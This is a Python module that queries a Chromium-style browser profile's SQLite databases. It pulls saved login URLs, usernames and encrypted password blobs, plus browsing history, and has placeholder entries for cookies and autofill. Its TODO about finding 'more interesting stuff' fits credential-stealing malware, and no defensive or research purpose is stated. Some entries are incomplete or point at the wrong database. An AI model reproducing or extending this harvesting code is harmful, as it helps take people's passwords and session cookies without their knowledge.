import sqlite3
import os

# TODO: SEE IF THERE'S MORE INTERESTING STUFF TO LIST
QUERIES = {
    "logins": {
        "db": "Default/Login Data",
        "query": "SELECT origin_url, username_value, hex(password_value) FROM logins;",
        "encrypted": True
    },
    "cookies": {
        "db": "Default/Cookies",
        "query": """...""",
        "encrypted": True
    },
    "autofill": {
        "db": "Default/Cookies",
        "query": """...""",
        "encrypted": False
    },
    "history": {
        "db": "Default/History",
        "query": """SELECT url FROM urls;""",
        "encrypted": False
    }
}

def fetch_browser_data(browser_path: str, data: str, queries: dict=QUERIES) -> list[tuple[str]]:
    """Returns specific data from browser's config DBs"""
    if data not in queries:
        raise ValueError(f"Unknown data type: {data}")
    
    if QUERIES[data]["query"] == "...":
        return []
    
    db_file = os.path.join(browser_path, queries[data]["db"])
    
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        cursor.execute(queries[data]["query"])
        rows = cursor.fetchall()
        conn.close()
        return rows
    except Exception as e:
        raise Exception(f"Failed to fetch {data}: {e}")
